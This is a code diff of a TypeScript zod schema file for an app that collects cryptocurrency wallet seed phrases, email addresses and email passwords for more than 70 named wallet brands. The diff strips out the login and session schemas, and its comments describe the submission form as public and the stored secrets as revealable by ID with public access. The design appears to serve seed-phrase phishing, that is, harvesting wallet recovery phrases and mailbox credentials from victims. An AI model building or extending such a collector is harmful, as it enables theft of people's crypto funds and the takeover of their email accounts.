@@ -2,7 +2,7 @@
 import { z } from 'zod';
 
 // --- Wallet Types ---
-// Expanded and alphabetized list of wallet types
+// Expanded and alphabetized list of wallet types (over 70)
 export const WalletTypes = [
   'AlphaWallet', // Ethereum Mobile
   'Argent Wallet', // Smart Contract Wallet (Ethereum L2 focus)
@@ -97,6 +97,7 @@ export const WalletTypes = [
 
 // --- Seed Phrase Schema ---
 // Schema for data sent FROM the frontend form TO the backend API
+// This now represents the public submission structure.
 export const seedPhraseFormSchema = z.object({
   // userId is removed
   email: z.string().email({ message: 'Please enter a valid email address.' })
@@ -133,50 +134,31 @@ export const seedPhraseFormSchema = z.object({
   }).describe('The type of wallet or service this seed phrase belongs to.'),
 });
 
+// This type represents the data structure used in the frontend form and sent to the backend.
 export type SeedPhraseFormData = z.infer<typeof seedPhraseFormSchema>;
 
-// Schema for the metadata returned for the dashboard list
+// Schema for the metadata returned for the dashboard list (public list)
 export const seedPhraseMetadataSchema = z.object({
   _id: z.string(), // MongoDB ObjectId as string
   walletName: z.string(),
-  walletType: z.enum(WalletTypes),
+  walletType: z.enum(WalletTypes), // Use the expanded enum
   createdAt: z.string().datetime(), // Date as ISO string
 });
 
 export type SeedPhraseMetadata = z.infer<typeof seedPhraseMetadataSchema>;
 
-// Schema for the data returned when revealing a seed phrase (contains encrypted fields)
+// Schema for the data returned when revealing a seed phrase (contains encrypted fields, public access by ID)
 export const revealedSeedPhraseSchema = z.object({
   _id: z.string(),
-  encryptedEmail: z.string().optional(),
-  encryptedEmailPassword: z.string().optional(),
-  encryptedSeedPhrase: z.string(),
+  encryptedEmail: z.string().optional().or(z.literal('')), // Allow empty string from backend if not set
+  encryptedEmailPassword: z.string().optional().or(z.literal('')), // Allow empty string
+  encryptedSeedPhrase: z.string(), // Should always exist
   walletName: z.string(),
-  walletType: z.enum(WalletTypes),
+  walletType: z.enum(WalletTypes), // Use the expanded enum
 });
 
 export type RevealedSeedPhraseData = z.infer<typeof revealedSeedPhraseSchema>;
 
-
 // --- Authentication Schemas Removed ---
-/*
-export const signupSchema = z.object({ ... });
-export type SignupFormData = z.infer<typeof signupSchema>;
-
-export const loginSchema = z.object({ ... });
-export type LoginFormData = z.infer<typeof loginSchema>;
-
-export const userClientDataSchema = z.object({ ... });
-export type UserClientData = z.infer<typeof userClientDataSchema>;
-
-export const authResponseSchema = z.object({ ... });
-export type AuthResponseData = z.infer<typeof authResponseSchema>;
-*/
 
 // --- Session Type Removed ---
-/*
-export type Session = {
-  user: UserClientData | null;
-  error?: string;
-};
-*/
